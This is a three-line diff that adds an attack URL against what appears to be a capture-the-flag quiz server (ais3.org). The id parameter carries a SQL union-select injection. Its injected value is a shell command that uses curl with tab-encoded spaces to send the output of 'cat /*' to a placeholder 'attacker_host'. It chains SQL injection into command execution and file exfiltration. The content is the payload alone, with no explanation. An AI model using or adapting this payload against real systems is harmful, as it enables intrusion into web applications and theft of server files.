@@ -1,0 +1,3 @@
+http://quiz.ais3.org:8001/
+?module=modules/api
+&id=0 union select 1,"';curl%09http://attacker_host/$(cat%09/*);'",3--
